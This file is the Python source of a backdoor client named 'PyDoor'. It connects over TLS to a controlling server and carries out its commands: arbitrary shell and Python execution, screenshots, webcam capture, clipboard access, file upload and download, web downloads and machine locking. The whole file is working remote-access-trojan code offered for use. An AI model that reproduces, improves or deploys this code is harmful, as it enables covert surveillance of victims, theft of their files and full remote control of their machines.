""" PyDoor Client """
import os
import ssl
import json
import socket
import logging
import getpass
import platform
import subprocess
import queue
from contextlib import suppress

from modules import clipboard, download, screen, webcam, windows, pyshell
from utils.baseclient import Client
from utils import tasks

logging.basicConfig(level=logging.DEBUG)

BLOCK_SIZE = 32768


class CommandClient(Client):
    """ Client for managing commands """

    # List of tasks that have output, but timed out
    task_list: list[tasks.Task] = []

    def __init__(self, ssl_context: ssl.SSLContext):
        Client.__init__(self, ssl_context)

    def listen(self):
        """ Listen for coming commands """
        # Wait for a command to arrive
        command = self.read().decode()
        match command:
            case 'PING':
                self.ping()
            case "CWD":
                self.cwd()
            case "SYSTEM":
                self.system()
            case "USER":
                self.user()
            case "HOME":
                self.home()
            case "HOSTNAME":
                self.hostname()
            case 'SHELL':
                self.shell()
            case 'PYTHON':
                self.interpreter()
            case 'SCREENSHOT':
                self.screenshot()
            case 'WEBCAM':
                self.webcam()
            case 'COPY':
                self.copy()
            case 'PASTE':
                self.paste()
            case 'SEND_FILE':
                self.send_file()
            case 'RECEIVE_FILE':
                self.receive_file()
            case 'DOWNLOAD':
                self.download()
            case 'LOCK':
                self.lock()
            case 'TASKS':
                self.get_tasks()
            case 'STOPTASK':
                self.stoptask()
            case 'TASKOUTPUT':
                self.taskoutput()
            case _:
                logging.debug('Received unrecognized command: %s', command)

    def ping(self):
        """ Respond to server ping """
        logging.info("Responding to server ping")
        self.write(b'PONG')

    def cwd(self):
        """ Send cwd to server """
        logging.info("Sending cwd to server")
        self.write(os.getcwdb())

    def system(self):
        """ Send platform to server """
        logging.info("Sending system to server")
        self.write(platform.system().encode())

    def user(self):
        """ Send user to server """
        logging.info("Sending user to server")
        self.write(getpass.getuser().encode())

    def home(self):
        """ Send home to server """
        logging.info("Sending home to server")
        self.write(os.path.expanduser('~').encode())

    def hostname(self):
        """ Send hostname to server """
        logging.info("Sending hostname to server")

        hostname = socket.gethostname()
        # Remove .local ending on macos
        if platform.system() == "Darwin" and hostname.endswith(".local"):
            hostname = hostname[:-len(".local")]

        self.write(hostname.encode())

    def shell(self):
        """ Open a shell for peer """
        command = self.read().decode()
        logging.info('Executing shell command: %s', command)
        output = subprocess.run(command, shell=True, capture_output=True, check=False)
        self.write(output.stdout + output.stderr)

    def interpreter(self):
        """ Open python interpreter for peer """
        command = self.read().decode()

        # Create task
        task = pyshell.pyshell(command)

        # Define timeout until task is put into background
        timeout = 50

        try:
            output: str = task.output.get(timeout=timeout)
        except queue.Empty:
            # Add task to background tasks
            self.task_list.append(task)
            self.write(f'Timed out after {timeout}s.\n'.encode())
        else:
            self.write(output.encode())

    def screenshot(self):
        """ Take a screenshot """
        logging.debug('Capturing screenshot')
        try:
            data = screen.screenshot()
        except RuntimeError as error:
            error_message = f'{error.__class__.__name__}: {str(error)}'
            logging.error('Error taking screenshot: %s', error_message)
            data = ('ERROR: ' + error_message).encode()
        else:
            logging.info('Successfully captured screenshot')
        self.write(data)

    def webcam(self):
        """ Capture webcam """
        logging.debug('Capturing webcam')
        try:
            img_data = webcam.capture_webcam()
        except RuntimeError:
            logging.error('Could not capture webcam')
            img_data = b'ERROR'
        else:
            logging.info('Captured webcam')
        self.write(img_data)

    def copy(self):
        """ Copy to clipboard """
        logging.debug('Attempting to copy to clipboard')
        data = self.read().decode()
        try:
            clipboard.copy(data)
        except RuntimeError as error:
            logging.error('Error occurred copying to clipboard: %s', str(error))
            self.write(str(error).encode())
        else:
            logging.info('Copied "%s" to clipboard', data)
            self.write(b'SUCCESS')

    def paste(self):
        """ Paste from clipboard """
        logging.debug('Attempting to paste from clipboard')
        try:
            content = clipboard.paste()
        except RuntimeError as error:
            logging.error('Error occurred pasting from clipboard: %s', str(error))
            self.write(str(error).encode())
        else:
            if content is None:
                content = ''
            logging.info('Pasted "%s" from clipboard', content)
            self.write(b'SUCCESS')
            self.write(content.encode())

    def send_file(self):
        """ Send a file to server """
        logging.debug('Sending file to server')
        filename = self.read().decode()
        try:
            with open(filename, 'rb') as file:
                # Confirm file was successfully opened
                self.write(b'FILE_OPENED')
                # Transfer file
                self.ssl_sock.sendfile(file=file)

            # Indicate transfer has completed
            self.ssl_sock.sendall(b"FILE_TRANSFER_COMPLETE")

        except (FileNotFoundError, PermissionError) as error:
            # Send error instead of FILE_OPENED
            logging.error('Error opening file %s: %s', filename, str(error))
            self.write(f'{error.__class__.__name__}: {str(error)}'.encode())
        else:
            logging.info('Successfully transferred file %s to server', str(filename))

    def receive_file(self):
        """ Receive file from server """
        logging.debug('Attempting to receive file from server')
        filename = self.read().decode()
        try:
            with open(filename, 'wb') as file:
                self.write(b'FILE_OPENED')
                while True:
                    block = self.ssl_sock.recv(4096)
                    if block == b'FILE_TRANSFER_COMPLETE':
                        break
                    file.write(block)

        except PermissionError as error:
            logging.error('Insufficient permissions writing to file "%s" during receive', filename)
            self.write(f'{error.__class__.__name__}: {str(error)}'.encode())
        else:
            logging.info("Transferred '%s' from server successfully", filename)

    def download(self):
        """ Download a file from the web """
        logging.debug("Attempting to download file from the web")
        url, filename = json.loads(self.read().decode())

        try:
            task = download.download(url, filename)
        except TimeoutError:
            logging.error("Download of '%s' timed out", url)
            self.write(b"Download timed out.")
        except (RuntimeError, OSError) as error:
            logging.error("Error downloading file from the web: %s", str(error))
            self.write(str(error).encode())
        else:
            # Add task to task_list
            self.task_list.append(task)
            logging.info("Downloading file from '%s' as '%s'", url, filename)
            self.write(b'Success')

    def lock(self):
        """ Lock Machine (Windows only) """
        logging.debug("Attempting to lock machine")

        try:
            windows.lock()
        except AttributeError as error:
            logging.error("Could not lock machine: %s", str(error))
            self.write(b"Locking is only supported on Windows.")
        except OSError as error:
            logging.error("Could not lock machine: %s", str(error))
            self.write(str(error).encode())
        else:
            logging.info("Locked machine")
            self.write(b'LOCKED')

    def get_tasks(self):
        """ Get current tasks (background threads), removes fully processed ones """
        task_info = []
        tasks.clean(self.task_list)

        for task in self.task_list:
            info = [task.identifer, task.native_id if task.is_alive() else None]
            info.extend(json.loads(task.name))

            task_info.append(info)

        self.write(json.dumps(task_info).encode())

    def stoptask(self):
        """ Stop a running task """
        task_id = self.read().decode()
        logging.debug("Attempting to stop task (%s)", task_id)

        task = tasks.find(self.task_list, task_id)

        if task is None:
            self.write(b'Task could not be found.')
            logging.debug("Task (%s) could not be found.", task_id)
            return

        if task.stop is None:
            self.write(b'Task does not support stopping.')
            logging.debug("Task %s (%s) does not support stopping. ", task.name, task_id)
            return

        # Stop task
        task.stop.set()
        logging.debug("Task stopped: %s (%s)", task.name, task_id)
        self.write(b'STOPPED')

    def taskoutput(self):
        """ Get the output of a task if available """
        task_id = self.read().decode()
        logging.debug("Attempting to get task (%s) output", task_id)

        task = tasks.find(self.task_list, task_id)

        if task is None:
            self.write(b'Task could not be found.')
            logging.debug("Task (%s) could not be found.", task_id)
            return

        if task.output is None:
            self.write(b'Task does not support output.')
            logging.debug("Task (%s) does not return output.", task_id)
            return

        if task.output.qsize() == 0:
            self.write(b'Task is not ready.')
            logging.debug("Task (%s) is not ready", task_id)
            return

        output: str = task.output.get()
        logging.debug("Task (%s) output: %s", task_id, output)
        self.write(b'READY')
        self.write(output.encode())


if __name__ == '__main__':

    # Create SSLContext
    context = ssl.create_default_context(cafile="cert.pem")

    # Connect to server
    client = CommandClient(context)
    client.connect(('localhost', 6969))

    # Listen to commands indefinitely
    while True:
        with suppress(TimeoutError):
            client.listen()
